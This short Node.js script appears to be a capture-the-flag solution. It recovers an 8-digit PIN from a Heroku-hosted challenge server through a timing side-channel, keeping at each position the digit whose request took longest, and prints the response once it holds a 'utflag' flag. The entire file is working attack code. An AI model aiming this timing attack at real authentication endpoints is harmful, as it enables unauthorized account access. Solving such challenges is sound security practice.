const request = require("request-promise");
const PINLEN = 8;

function rightPad(str, length) {
    var copy = str;
    while (copy.length < length) {
        copy = copy + "0";
    }

    return copy;
}

async function test(pin) {
    console.log("Testing pin: " + pin);
    var start = Date.now();
    var body = await request({
        method: "POST",
        uri: "https://isss-ctf-neils-avacados-reveng.herokuapp.com/",
        form: {
            "pin": pin,
        }
    });

    var end = Date.now();

    if (body.indexOf("utflag") !== -1) {
        console.log(body);
        process.exit(0);
    }
    return end - start;
}

async function solve() {
    var left = "";
    for (let i = 0; i < PINLEN; ++i) {
        let times = [];
        for (let j = 0; j <= 9; ++j) {
            times[j] = await test(rightPad(`${left}${j}`, PINLEN)); 
        }

        let maxTime = 0;
        let maxDigit = -1;
        for (let digit = 0; digit <= 9; ++digit) {
            if (times[digit] > maxTime) {
                maxTime = times[digit];
                maxDigit = digit;
            }
        }

        left += "" + maxDigit;
    }
}

solve();